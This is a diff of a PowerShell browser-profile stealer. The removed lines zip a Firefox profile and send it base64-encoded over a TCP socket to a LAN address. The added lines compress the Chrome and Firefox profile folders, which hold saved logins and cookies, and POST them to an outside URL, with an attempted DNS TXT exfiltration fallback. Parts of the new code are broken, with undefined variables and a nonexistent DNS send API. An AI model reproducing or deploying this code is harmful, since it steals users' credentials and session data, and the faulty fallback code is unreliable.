@@ -9,16 +9,11 @@
 
 #>
 
-$profilespath=$env:APPDATA+"\Mozilla\Firefox\Profiles"
-$profilesInipath=$env:APPDATA+"\Mozilla\Firefox\profiles.ini"
-$myArray = @{}
-$i = 0 
-
 #-------------------------------------------------------------------
 #BANNER
 #-------------------------------------------------------------------
 Write-Host "" -ForegroundColor Yellow
-Write-Host "  _,-=._            /|_/|   Hi!Fox" -ForegroundColor Yellow
+Write-Host "  _,-=._            /|_/|   Hi!" -ForegroundColor Yellow
 Write-Host " `-.}   `=._,.-=-._.,  @ @._," -ForegroundColor Yellow
 Write-Host "     `._ _,-.   )      _,.-'" -ForegroundColor Yellow
 Write-Host "        `    G.m-^m`m'" -ForegroundColor Yellow
@@ -29,186 +24,96 @@ Write-Host "" -ForegroundColor Yellow
 #Check winRAR installed
 #-------------------------------------------------------------------
 
-if(Test-Path "C:\Program Files\Winrar"){
-      Write-Host "WinRAR detected on system!" -ForegroundColor Green
-      $winrarPath = "C:\Program Files\Winrar\WinRAR.exe"
-      $wrar = 1 
 
-}else{
-      Write-Host "WinRAR not detected on system, will use only .zip files" -ForegroundColor Red
-      $wrar = 0
-}
 
-#-------------------------------------------------------------------
-#Zip/RAR Finding
-#-------------------------------------------------------------------
+function Compress-FolderToMemory($sourceFolder) {
+    $memoryStream = New-Object System.IO.MemoryStream
+    $gzipStream = New-Object System.IO.Compression.GzipStream($memoryStream, [IO.Compression.CompressionMode]::Compress)
+    $buffer = New-Object byte[](4096)
 
-if($wrar){
-
-      $zipFilesInDownloadPath = Get-ChildItem -Path $env:USERPROFILE -Include *.zip,*.rar,*.tar.gz -r | Sort-Object Length
-
-      if ($zipFilesInDownloadPath.Length -eq "0") {
-            $fileOpt = Read-Host -Prompt "No zip found on user path.
-            `nDo a massive search? Use a Random path? (F/R)`n"
-      }else{
-            $zipFilesInDownloadPath[0].FullName
-            $fileOpt = Read-Host -Prompt "This is the smallest compressed file in the user folder.
-            `nDo you want to use it? 
-            `nDo a massive search? 
-            `nUse a Random path? (Y/F/R)`n"
-      }
-
-      if ($fileOpt -eq "Y") {
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }elseif($fileOpt -eq "F"){
-            #FullFileSearch
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }elseif($fileOpt -eq "R"){
-            #RandomFileSearch
-            $fileRnd = Read-Host -Prompt "Enter path to search some zip file"
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }
-
-}else{
-
-      $zipFilesInDownloadPath = Get-ChildItem -Path $env:USERPROFILE -Include *.zip,*.tar.gz -r | Sort-Object Length
-
-      if ($zipFilesInDownloadPath.Length -eq "0") {
-            $fileOpt = Read-Host -Prompt "No zip found on user path.`nDo a massive search?`nUse a Random path?`n(F/R)`n"
-      }else{
-            $zipFilesInDownloadPath[0].FullName
-            $fileOpt = Read-Host -Prompt "This is the smallest compressed file in the user folder. 
-            `nDo you want to use it? 
-            `nDo a massive search? 
-            `nUse a Random path? 
-            (Y/F/R)`n"
-      }
-
-      if ($fileOpt -eq "Y") {
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }elseif($fileOpt -eq "F"){
-            #FullFileSearch
-            $zipFilesInDownloadPath = Get-ChildItem -Path "C:\" -Include *.zip,*.tar.gz -r | Sort-Object Length
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }elseif($fileOpt -eq "R"){
-            #RandomFileSearch
-            $fileRnd = Read-Host -Prompt "Enter path to search some zip file"
-            $zipFilesInDownloadPath = Get-ChildItem -Path $fileRnd -Include *.zip,*.tar.gz -r | Sort-Object Length
-            $zipObj = $zipFilesInDownloadPath[0].FullName
-      }
-
-}
-<#
-$rnd = Get-Random
-$zipDest = $env:TMP+"\"+$rnd+".zip"
-Compress-Archive -Path $_.FullName -CompressionLevel Fastest -DestinationPath $zipDest
-#>
-
-#Interact with selected zipped
-$file1 = "C:\Users\jomoza\Desktop\"
-
-#([IO.FileInfo]$zipObj).Extension 
-#-------------------------------------------------------------------
-#Selecting profile Ini
-#ParseProfileIni
-#-------------------------------------------------------------------
-
-if ([System.IO.File]::Exists($profilesInipath)) {
-      Write-Host "Default profile init exist : "$profilesInipath
-      $opIni = Read-Host -Prompt 'Use it? (Y/N)'
-      if ($opIni -eq "N")                 
-      {
-            $profilesInipath = Read-Host -Prompt 'Enter profile.ini file (full path):'
-      }
-      Get-Content $profilesInipath | ForEach-Object {
-            if ($_.StartsWith('Path=')) {
-                  $name, $value = $_ -split "=", 2
-                  if (!$value.StartsWith("Profiles")) {     
-                        #Write-Host $value
-                        $profPa = $value+"\"
-                        $myArray.Add("$i","$profPa")
-                        $i++
-                  }
+    [IO.Directory]::EnumerateFiles($sourceFolder, "*", [IO.SearchOption]::AllDirectories) | ForEach-Object {
+        $input = [IO.File]::OpenRead($_)
+        try {
+            while (($read = $input.Read($buffer, 0, $buffer.Length)) -gt 0) {
+                $gzipStream.Write($buffer, 0, $read)
             }
-      }
+        } finally {
+            $input.Dispose()
+        }
+    }
 
-}
-$items = Get-ChildItem -Path $profilespath
-foreach ($item in $items){
-      $i++
-      $myArray.Add("$i","$profilespath\$item\")
-}
-
-#-------------------------------------------------------------------#
-
-
-#-------------------------------------------------------------------#
-
-Write-Host "`n[+] Selecting profile path:"
-Write-Host "[+] default profiles paths."
-$myArray.Keys | ForEach-Object {
-      Write-Host "[+] : $_ : "$myArray.$_
-}
-Write-Host "[+] : X : Enter custom profile path." 
-Write-Host "`n"$myArray.Count"Profiles Found, select one.`n"
-
-$ProfPathNum = Read-Host -Prompt 'Enter option:'
-
-if ($ProfPathNum -eq "X") {
-      $ProfTo = Read-Host -Prompt 'Enter path (full) of profile target :'
-}else { 
-      $ProfTo = $myArray[$ProfPathNum].ToString()  
+    $gzipStream.Dispose()
+    $memoryStream.ToArray()
 }
 
-Write-Host "You select " $ProfTo
-<#
-Write-Host "Profile content :`n"
-$files = get-childitem $ProfTo -Name
-foreach ($file in $files)
-{
-      Write-Host $file
-      if ($file -eq "logins.json") {
-            $loginPath = $myArray[$ProfPathNum]+""+$file
-            Write-Host $loginPath      
-      }
+
+function Get-Base64SizeInBytes($base64) {
+    [math]::Ceiling($base64.Length / 4) * 3
 }
 
-<#
-Compresing ff profile using Compres-Archive and WinRAR bin. 
-#>
-$winrar = "C:\Program Files\WinRAR\WinRAR.exe"
-#$profilespath=$env:APPDATA+"\Mozilla\Firefox\Profiles\"
-$profilespath="C:\Users\jomoza\AppData\Roaming\Mozilla\Firefox\Profiles\c3knmtm6.Default Firefox JoMoZa-1562781524304"
-$rnd = Get-Random
-$zipDest = $env:TMP+"\"+$rnd+".zip"
-$socket = New-Object net.sockets.tcpclient("192.168.1.38",11000);
-$stream = $socket.GetStream();
-$writer = new-object System.IO.StreamWriter($stream);
 
-Write-Output $profilespath
+$chromeProfileDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$firefoxProfileDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
+$dateString = Get-Date -Format "yyyyMMdd-HHmmss"
+$chromeZipPath = "$env:temp\chrome-backup-$dateString.zip"
+$firefoxZipPath = "$env:temp\firefox-backup-$dateString.zip"
 
-Compress-Archive -Update -Path $profilespath -CompressionLevel Fastest -DestinationPath $zipDest
-$ZipFileLocation = [System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipDest));
-Write-Output $zipDest
-$writer.WriteLine($ZipFileLocation);
-$socket.close()
+Compress-Archive -Path $chromeProfileDir -DestinationPath $chromeZipPath
+Compress-Archive -Path $firefoxProfileDir -DestinationPath $firefoxZipPath
 
-if(([IO.FileInfo]$zipObj).Extension -eq ".rar"){
-      Get-ChildItem $ProfTo | ForEach-Object {
-            Write-Host $_.FullName
-            &$winrar e -ep1 -idq -r -y $_.FullName $zipObj
-            $ZipFileLocation =[System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipObj));
 
-            #$writer.WriteLine($ZipFileLocation);
-      }       
-}else{
-      Get-ChildItem $ProfTo | ForEach-Object {
-            Write-Host $_.FullName
-            Compress-Archive -Path $_.FullName -Update -DestinationPath $zipObj
-            $ZipFileLocation =[System.Convert]::ToBase64String([io.file]::ReadAllBytes($zipObj));
-            
-      }              
+$chromeZipBytes = Get-Content -Path $chromeZipPath -Encoding Byte
+$firefoxZipBytes = Get-Content -Path $firefoxZipPath -Encoding Byte
+
+
+$chromeZipMemory = Compress-FolderToMemory $chromeProfileDir
+$firefoxZipMemory = Compress-FolderToMemory $firefoxProfileDir
+
+
+$chromeBase64 = [System.Convert]::ToBase64String($chromeZipMemory)
+$firefoxBase64 = [System.Convert]::ToBase64String($firefoxZipMemory)
+
+
+$maxDnsTxtRecordSize = 512
+if (Get-Base64SizeInBytes($chromeBase64) -gt $maxDnsTxtRecordSize -or Get-Base64SizeInBytes($firefoxBase64) -gt $maxDnsTxtRecordSize) {
+    
+    $uri = "https://example.com/backup"
+    $body = @{
+        chromeBase64 = $chromeBase64
+        firefoxBase64 = $firefoxBase64
+    }
+    Invoke-RestMethod -Uri $uri -Method Post -Body $body
+} else {
+    
+    $dnsName = "$subdomain.$domain"
+
+    
+    $txtRecordSize = [System.Text.Encoding]::ASCII.GetByteCount($base64Zip)
+    if ($txtRecordSize -gt 512) {
+        Write-Host "El tamaño del registro TXT supera el límite de 512 bytes. Enviando a través de una petición HTTP POST..."
+        $headers = @{ "Content-Type" = "application/x-www-form-urlencoded" }
+        $body = @{ "data" = $base64Zip }
+        $response = Invoke-WebRequest -Uri $postUrl -Method POST -Headers $headers -Body $body
+        if ($response.StatusCode -eq 200) {
+            Write-Host "Los datos se enviaron correctamente a través de una petición HTTP POST"
+        } else {
+            Write-Warning "No se pudo enviar la información a través de una petición HTTP POST"
+        }
+    } else {
+        $dnsTxtRecord = "$subdomain IN TXT `"$base64Zip`""
+        $dnsTxtRecordBytes = [System.Text.Encoding]::ASCII.GetBytes($dnsTxtRecord)
+        $dnsRecordType = [Net.DnsRecordType]::Txt
+        $dnsClass = [Net.DnsClass]::In
+
+        
+        $dnsObject = New-Object System.Net.Dns()
+
+        
+        try {
+            $dnsObject.Send($dnsName, $dnsRecordType, $dnsClass, $dnsTxtRecordBytes)
+            Write-Host "Los datos se enviaron correctamente a través de una consulta DNS"
+        } catch {
+            Write-Warning "No se pudo enviar la información a través de una consulta DNS"
+        }
+    }
 }
-echo $ZipFileLocation
-$writer.WriteLine($ZipFileLocation);
-$socket.close()
